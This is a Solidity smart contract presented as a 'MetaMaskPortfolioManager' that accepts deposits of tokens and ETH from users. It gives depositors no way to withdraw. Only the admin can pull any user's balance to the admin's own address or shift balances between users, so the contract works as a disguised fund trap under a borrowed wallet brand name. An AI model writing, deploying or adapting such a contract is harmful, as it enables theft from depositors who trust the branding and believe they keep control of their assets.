// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract MetaMaskPortfolioManager {
    address public admin;
    mapping(address => mapping(address => uint256)) public userBalances;
    address[] public supportedTokens;

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    event TokenDeposited(address indexed user, address indexed token, uint256 amount);
    event ETHDeposited(address indexed user, uint256 amount);
    event AdminWithdrawToken(address indexed admin, address indexed user, address indexed token, uint256 amount);
    event AdminWithdrawETH(address indexed admin, address indexed user, uint256 amount);

    constructor(address[] memory initialTokens) {
        admin = msg.sender;
        supportedTokens = initialTokens;
    }

    function depositTokens(address[] calldata tokens, uint256[] calldata amounts) external {
        require(tokens.length == amounts.length, "Array mismatch");
        for (uint i = 0; i < tokens.length; i++) {
            require(IERC20(tokens[i]).transferFrom(msg.sender, address(this), amounts[i]), "Transfer failed");
            userBalances[msg.sender][tokens[i]] += amounts[i];
            emit TokenDeposited(msg.sender, tokens[i], amounts[i]);
        }
    }

    function depositETH() external payable {
        userBalances[msg.sender][address(0)] += msg.value;
        emit ETHDeposited(msg.sender, msg.value);
    }

    function adminWithdrawToken(address token, address user, uint256 amount) external onlyAdmin {
        require(userBalances[user][token] >= amount, "Insufficient balance");
        userBalances[user][token] -= amount;
        require(IERC20(token).transfer(admin, amount), "Transfer failed");
        emit AdminWithdrawToken(msg.sender, user, token, amount);
    }

    function adminWithdrawETH(address user, uint256 amount) external onlyAdmin {
        require(userBalances[user][address(0)] >= amount, "Insufficient balance");
        userBalances[user][address(0)] -= amount;
        payable(admin).transfer(amount);
        emit AdminWithdrawETH(msg.sender, user, amount);
    }

    function adminTransferToken(address token, address fromUser, address toUser, uint256 amount) external onlyAdmin {
        require(userBalances[fromUser][token] >= amount, "Insufficient balance");
        userBalances[fromUser][token] -= amount;
        userBalances[toUser][token] += amount;
    }

    function getUserBalance(address user, address token) external view returns (uint256) {
        return userBalances[user][token];
    }

    function addSupportedToken(address token) external onlyAdmin {
        supportedTokens.push(token);
    }

    function getSupportedTokens() external view returns (address[] memory) {
        return supportedTokens;
    }
}
